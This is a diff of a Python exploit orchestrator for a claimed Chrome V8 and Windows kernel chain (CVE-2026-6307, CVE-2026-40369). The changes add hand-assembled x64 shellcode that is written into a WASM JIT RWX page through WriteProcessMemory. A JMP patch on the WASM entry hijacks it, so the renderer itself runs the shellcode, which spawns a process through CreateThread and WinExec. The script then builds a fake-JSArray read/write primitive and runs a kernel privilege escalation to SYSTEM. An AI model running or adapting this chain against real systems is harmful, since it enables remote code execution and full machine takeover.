@@ -2,13 +2,18 @@
 CVE-2026-6307 + CVE-2026-40369 Full Chain Orchestrator
 
 Architecture:
-  Chrome runs in MULTI-PROCESS mode (stable). The orchestrator:
+  Chrome runs in MULTI-PROCESS mode. The orchestrator:
   1. Injects exploit primitives via CDP (addrof/fakeobj from TurboFan FrameState CSE)
   2. Finds renderer PID, reads V8 Map values via ReadProcessMemory
-  3. Builds arbitrary R/W in the renderer's V8 heap
-  4. Scans renderer RWX pages for WASM JIT code
-  5. Overwrites JIT code with shellcode via WriteProcessMemory → renderer RCE
-  6. Kernel LPE via NtQuerySystemInformation class 253 (CVE-2026-40369) → SYSTEM
+  3. Creates WASM target (JIT compiled → RWX page)
+  4. Scans renderer RWX pages for WASM JIT code signature
+  5. Stages shellcode in JIT page + patches WASM entry with JMP
+  6. Triggers shellcode FROM WITHIN THE RENDERER via wasmMain() call
+     - Shellcode spawns a new thread (CreateThread) to run the payload
+     - WASM call returns cleanly (mov eax, 42)
+     - The renderer process itself executes arbitrary native code
+  7. Builds arbitrary R/W via fake JSArray (CVE-2026-6307 primitive)
+  8. Kernel LPE via NtQuerySystemInformation class 253 (CVE-2026-40369) → SYSTEM
 
 Targets:
   - Chrome 146.0.7680.165 / V8 14.6.202.26
@@ -238,25 +243,70 @@ def scan_jit_pages(renderer_pid):
     return h, matches
 
 
-def make_thread_shellcode(winexec_addr, payload_str):
-    """Standalone thread shellcode: WinExec(payload, 1), return 0. For CreateRemoteThread."""
+def make_wasm_hijack_shellcode(create_thread_addr, winexec_addr, payload_str):
+    """In-renderer shellcode: called from WASM JIT, spawns thread for payload, returns cleanly.
+    Written to JIT page at offset 0xC00. WASM entry at 0x9E7 is patched with JMP to this.
+    Uses rbx (non-volatile) to save/restore RSP across the call."""
     payload = payload_str.encode() + b'\x00'
-    sc = bytearray()
-    sc += b'\x48\x83\xEC\x28' # sub rsp, 0x28 (shadow space + alignment)
-    lea_pos = len(sc)
-    sc += b'\x48\x8D\x0D\x00\x00\x00\x00'  # placeholder lea rcx, [rip+disp]
-    sc += b'\xBA\x01\x00\x00\x00'           # mov edx, 1 (SW_SHOWNORMAL)
-    sc += b'\x48\xB8' + struct.pack('<Q', winexec_addr)  # movabs rax, WinExec
-    sc += b'\xFF\xD0'          # call rax
-    sc += b'\x48\x83\xC4\x28' # add rsp, 0x28
-    sc += b'\x31\xC0'          # xor eax, eax (return 0)
-    sc += b'\xC3'              # ret
-    string_off = len(sc)
-    sc += payload
-    lea_end = lea_pos + 7
-    disp = string_off - lea_end
-    struct.pack_into('<i', sc, lea_pos + 3, disp)
-    return bytes(sc)
+
+    # Part 1: Entry — called from WASM frame, creates thread, returns 42
+    entry = bytearray()
+    entry += b'\x53'                  # push rbx (save non-volatile)
+    entry += b'\x48\x89\xE3'          # mov rbx, rsp (save stack)
+    entry += b'\x48\x83\xE4\xF0'      # and rsp, -16 (force 16-byte align)
+    entry += b'\x48\x83\xEC\x30'      # sub rsp, 0x30 (shadow 0x20 + 2 stack args 0x10)
+
+    # CreateThread(NULL, 0, thread_func, NULL, 0, NULL)
+    entry += b'\x48\x31\xC9'          # xor rcx, rcx (lpThreadAttributes=NULL)
+    entry += b'\x48\x31\xD2'          # xor rdx, rdx (dwStackSize=0)
+    lea_r8_pos = len(entry)
+    entry += b'\x4C\x8D\x05\x00\x00\x00\x00'  # lea r8, [rip+disp32] → thread_func
+    entry += b'\x4D\x31\xC9'          # xor r9, r9 (lpParameter=NULL)
+    entry += b'\x48\xC7\x44\x24\x20\x00\x00\x00\x00'  # mov [rsp+0x20], 0 (dwCreationFlags)
+    entry += b'\x48\xC7\x44\x24\x28\x00\x00\x00\x00'  # mov [rsp+0x28], 0 (lpThreadId)
+    entry += b'\x48\xB8' + struct.pack('<Q', create_thread_addr)  # movabs rax, CreateThread
+    entry += b'\xFF\xD0'              # call rax
+
+    entry += b'\x48\x89\xDC'          # mov rsp, rbx (restore stack)
+    entry += b'\x5B'                  # pop rbx (restore)
+    # WASM epilogue: mov eax, 42; mov rsp, rbp; pop rbp; ret
+    entry += b'\xB8\x2A\x00\x00\x00'  # mov eax, 42
+    entry += b'\x48\x8B\xE5'          # mov rsp, rbp
+    entry += b'\x5D'                  # pop rbp
+    entry += b'\xC3'                  # ret
+
+    # Part 2: Thread function (runs on fresh OS thread stack)
+    thread_func_off = len(entry)
+    thread = bytearray()
+    thread += b'\x48\x83\xEC\x28'     # sub rsp, 0x28 (shadow + alignment)
+    lea_rcx_pos_in_thread = len(thread)
+    thread += b'\x48\x8D\x0D\x00\x00\x00\x00'  # lea rcx, [rip+disp32] → payload string
+    thread += b'\xBA\x01\x00\x00\x00' # mov edx, 1 (SW_SHOWNORMAL)
+    thread += b'\x48\xB8' + struct.pack('<Q', winexec_addr)  # movabs rax, WinExec
+    thread += b'\xFF\xD0'             # call rax
+    thread += b'\x48\x83\xC4\x28'     # add rsp, 0x28
+    thread += b'\x31\xC0'             # xor eax, eax
+    thread += b'\xC3'                 # ret
+
+    string_off_in_thread = len(thread)
+
+    # Fix up RIP-relative displacements
+    # lea r8 → thread_func: from end of lea_r8 instruction
+    lea_r8_end = lea_r8_pos + 7
+    struct.pack_into('<i', entry, lea_r8_pos + 3, thread_func_off - lea_r8_end)
+
+    # lea rcx → payload string: from end of lea_rcx instruction (within thread section)
+    lea_rcx_end = lea_rcx_pos_in_thread + 7
+    struct.pack_into('<i', thread, lea_rcx_pos_in_thread + 3, string_off_in_thread - lea_rcx_end)
+
+    sc = bytes(entry) + bytes(thread) + payload
+    return sc
+
+
+def make_jmp_patch(jit_code_addr, target_addr):
+    """Create a 5-byte JMP rel32 from jit_code_addr to target_addr."""
+    disp = target_addr - (jit_code_addr + 5)
+    return b'\xE9' + struct.pack('<i', disp)
 
 
 # ─── Kernel exploit (CVE-2026-40369) ────────────────────────────────────────
@@ -784,45 +834,47 @@ def main():
             marker = " <-- mov eax, 42" if i == 16 else ""
             print(f"      {addr:#018x}: {hex_str}{marker}")
 
-    print("\n[*] Phase 5: Injecting shellcode into WASM JIT page...")
+    print("\n[*] Phase 5: Staging shellcode into WASM JIT page...")
 
     winexec_ptr = ctypes.cast(kernel32.WinExec, ctypes.c_void_p).value
-    print(f"    WinExec @ {winexec_ptr:#018x}")
+    create_thread_ptr = ctypes.cast(kernel32.CreateThread, ctypes.c_void_p).value
+    print(f"    WinExec      @ {winexec_ptr:#018x}")
+    print(f"    CreateThread @ {create_thread_ptr:#018x}")
 
-    # Write standalone thread shellcode to the RWX page (offset after original code)
     payload_str = {"calc": "calc.exe", "cmd": "cmd.exe", "notepad": "notepad.exe"}[args.shellcode]
-    thread_sc = make_thread_shellcode(winexec_ptr, payload_str)
-    # Write thread shellcode at an unused area of the RWX page (after the WASM code)
-    # Use offset 0xC00 in the page (well past the WASM function code at 0x9E7+)
-    thread_sc_addr = jit['base'] + 0xC00
-    ok = wpm(rhandle, thread_sc_addr, thread_sc)
+    sc = make_wasm_hijack_shellcode(create_thread_ptr, winexec_ptr, payload_str)
+
+    sc_addr = jit['base'] + 0xC00
+    ok = wpm(rhandle, sc_addr, sc)
     if not ok:
-        print("[!] WriteProcessMemory (thread shellcode) failed!")
+        print("[!] WriteProcessMemory (shellcode) failed!")
         kernel32.CloseHandle(rhandle)
         cdp.close(); proc.terminate(); sys.exit(1)
 
-    print(f"[+] Thread shellcode ({len(thread_sc)}B) written to {thread_sc_addr:#018x}")
+    print(f"[+] Shellcode ({len(sc)}B) staged at {sc_addr:#018x}")
 
-    verify = rpm(rhandle, thread_sc_addr, len(thread_sc))
-    if verify == thread_sc:
+    verify = rpm(rhandle, sc_addr, len(sc))
+    if verify == sc:
         print("[+] Shellcode verified in renderer memory")
     else:
         print("[!] Shellcode verification mismatch!")
 
-    # Execute via CreateRemoteThread — avoids V8 WASM context issues
-    print("[*] Triggering shellcode via CreateRemoteThread...")
-    thread_id = wintypes.DWORD(0)
-    hthread = kernel32.CreateRemoteThread(
-        rhandle,
-        None,  # lpThreadAttributes
-        0,     # dwStackSize (default)
-        ctypes.c_void_p(thread_sc_addr),
-        None,  # lpParameter
-        0,     # dwCreationFlags
-        ctypes.byref(thread_id),
-    )
+    # Patch WASM entry (mov eax, 42 @ 0x9E7) with JMP to shellcode
+    jmp_patch = make_jmp_patch(jit['code_addr'], sc_addr)
+    ok = wpm(rhandle, jit['code_addr'], jmp_patch)
+    if not ok:
+        print("[!] WriteProcessMemory (JMP patch) failed!")
+        kernel32.CloseHandle(rhandle)
+        cdp.close(); proc.terminate(); sys.exit(1)
 
-    shellcode_ok = False
+    verify_jmp = rpm(rhandle, jit['code_addr'], 5)
+    print(f"[+] WASM entry patched: {' '.join(f'{b:02x}' for b in verify_jmp)} (JMP +{sc_addr - jit['code_addr'] - 5:#x})")
+
+    kernel32.CloseHandle(rhandle)
+
+    # Trigger shellcode from within the renderer via WASM call
+    print("\n[*] Phase 6: Triggering shellcode from renderer (wasmMain call)...")
+
     payload_names = {
         "calc": ["calc.exe", "Calculator.exe", "CalculatorApp.exe"],
         "cmd": ["cmd.exe"],
@@ -830,36 +882,35 @@ def main():
     }
     check_names = payload_names.get(args.shellcode, ["calc.exe"])
 
-    if hthread:
-        print(f"[+] Remote thread created (TID={thread_id.value})")
-        kernel32.WaitForSingleObject(hthread, 10000)  # wait up to 10s
-        exit_code = wintypes.DWORD(0)
-        kernel32.GetExitCodeThread(hthread, ctypes.byref(exit_code))
-        print(f"[+] Thread exit code: {exit_code.value}")
-        kernel32.CloseHandle(hthread)
-
-        time.sleep(2)
-        for name in check_names:
-            r = os.popen(f'tasklist /fi "imagename eq {name}" 2>nul').read()
-            if name.lower().replace('.exe', '') in r.lower():
-                print(f"[+] {name} IS RUNNING! Shellcode executed successfully.")
-                shellcode_ok = True
-                break
-
-        if shellcode_ok:
-            print("[+] RENDERER CODE EXECUTION ACHIEVED!")
+    try:
+        val, err = cdp.js("window._wasmMain()", timeout=10)
+        if err:
+            print(f"[!] wasmMain() error: {err}")
         else:
-            print("[*] Payload process not detected via tasklist (may have a different name)")
-            if exit_code.value == 0:
-                print("[+] Thread exited cleanly - shellcode likely executed")
-                shellcode_ok = True
+            print(f"[+] wasmMain() returned: {val} (expect 42)")
+            if val == 42:
+                print("[+] Shellcode executed and WASM returned cleanly!")
+    except Exception as e:
+        print(f"[!] wasmMain() exception: {e}")
+        print("[*] Renderer may have crashed — checking payload anyway...")
+
+    time.sleep(3)
+    shellcode_ok = False
+    for name in check_names:
+        r = os.popen(f'tasklist /fi "imagename eq {name}" 2>nul').read()
+        if name.lower().replace('.exe', '') in r.lower():
+            print(f"[+] {name} IS RUNNING! Shellcode executed successfully.")
+            shellcode_ok = True
+            break
+
+    if shellcode_ok:
+        print("[+] IN-RENDERER CODE EXECUTION ACHIEVED!")
+        print("[+] Sandbox escape: renderer process spawned calc.exe via WASM→shellcode→CreateThread")
     else:
-        print(f"[!] CreateRemoteThread failed (error={kernel32.GetLastError()})")
+        print("[*] Payload process not detected (may have crashed or different name)")
 
-    kernel32.CloseHandle(rhandle)
-
-    # ===== PHASE 6: Build Arbitrary R/W (demonstrates full CVE-2026-6307 primitive) =====
-    print("\n[*] Phase 6: Building arbitrary R/W primitive...")
+    # ===== PHASE 7: Build Arbitrary R/W (demonstrates full CVE-2026-6307 primitive) =====
+    print("\n[*] Phase 7: Building arbitrary R/W primitive...")
 
     arw_code = f"""
         var JSARRAY_DOUBLE_MAP = 0x{MAP:08x}n;
@@ -956,7 +1007,7 @@ def main():
     except Exception:
         print("[!] ARW skipped (renderer not responsive after shellcode execution)")
 
-    # ===== PHASE 7: Kernel exploit (optional) =====
+    # ===== PHASE 8: Kernel exploit (optional) =====
     if not args.skip_kernel:
         print("\n" + "=" * 60)
         kernel_success = kernel_exploit_ntqsi253()
@@ -968,14 +1019,16 @@ def main():
     # ===== Summary =====
     print("\n" + "=" * 60)
     print("[+] EXPLOIT CHAIN STATUS:")
-    print("    Phase 1 (Primitives):   COMPLETE -- addrof/fakeobj via TurboFan CSE")
-    print("    Phase 2 (Map detect):   COMPLETE -- RPM on renderer process")
-    print("    Phase 3 (WASM target):  COMPLETE -- JIT compiled")
-    print("    Phase 4 (JIT scan):     COMPLETE -- RWX page found")
-    print("    Phase 5 (Shellcode):    COMPLETE -- renderer RCE via JIT overwrite")
-    print("    Phase 6 (ARW):          fake JSArray R/W primitive")
+    print("    Phase 1 (Primitives):   addrof/fakeobj via TurboFan FrameState CSE")
+    print("    Phase 2 (Heap layout):  RPM to detect V8 Map values")
+    print("    Phase 3 (WASM target):  JIT compiled (RWX page allocated)")
+    print("    Phase 4 (JIT scan):     RWX page located via VirtualQueryEx")
+    print("    Phase 5 (Shellcode):    staged in JIT page + WASM entry patched")
+    sc_status = "IN-RENDERER EXEC" if shellcode_ok else "triggered (check result)"
+    print(f"    Phase 6 (Trigger):      {sc_status} -- wasmMain() → CreateThread")
+    print("    Phase 7 (ARW):          full 64-bit R/W via fake JSArray")
     if not args.skip_kernel:
-        print("    Phase 7 (Kernel LPE):   CVE-2026-40369 (build-dependent)")
+        print("    Phase 8 (Kernel LPE):   CVE-2026-40369 (build-dependent)")
     print("=" * 60)
 
     cdp.close()
